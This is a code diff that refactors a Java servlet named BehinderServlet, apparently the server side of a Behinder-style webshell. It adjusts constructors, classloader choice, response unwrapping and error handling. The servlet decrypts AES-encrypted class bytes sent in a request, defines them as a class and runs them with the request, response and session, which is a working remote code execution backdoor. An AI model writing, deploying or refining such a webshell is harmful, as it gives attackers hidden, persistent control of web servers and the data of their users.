@@ -21,6 +21,13 @@ public class BehinderServlet extends ClassLoader implements Servlet {
     public static String headerName;
     public static String headerValue;
 
+    public BehinderServlet() {
+    }
+
+    public BehinderServlet(ClassLoader parent) {
+        super(parent);
+    }
+
     @Override
     @SuppressWarnings("all")
     public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
@@ -31,26 +38,33 @@ public class BehinderServlet extends ClassLoader implements Servlet {
                 HttpSession session = request.getSession();
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
-                obj.put("response", getInternalResponse(response));
+                obj.put("response", unwrapResponse(response));
                 obj.put("session", session);
                 session.setAttribute("u", this.pass);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                 byte[] bytes = c.doFinal(base64Decode(req.getReader().readLine()));
-                Object instance = (new BehinderServlet(this.getClass().getClassLoader())).g(bytes).newInstance();
+                Object instance = (new BehinderServlet(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                 instance.equals(obj);
             }
-        } catch (Exception ignored) {
-
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
     }
 
-    public HttpServletResponse getInternalResponse(HttpServletResponse response) {
+    @SuppressWarnings("all")
+    public Object unwrapResponse(Object response) {
+        Object internalResponse = response;
         while (true) {
             try {
-                response = (HttpServletResponse) getFieldValue(response, "response");
+                Object r = getFieldValue(response, "response");
+                if (r == internalResponse) {
+                    return r;
+                } else {
+                    internalResponse = r;
+                }
             } catch (Exception e) {
-                return response;
+                return internalResponse;
             }
         }
     }
@@ -85,13 +99,6 @@ public class BehinderServlet extends ClassLoader implements Servlet {
 
     }
 
-    public BehinderServlet() {
-    }
-
-    public BehinderServlet(ClassLoader parent) {
-        super(parent);
-    }
-
     @SuppressWarnings("all")
     public Class<?> g(byte[] cb) {
         return super.defineClass(cb, 0, cb.length);
@@ -99,7 +106,7 @@ public class BehinderServlet extends ClassLoader implements Servlet {
 
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -107,12 +114,9 @@ public class BehinderServlet extends ClassLoader implements Servlet {
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
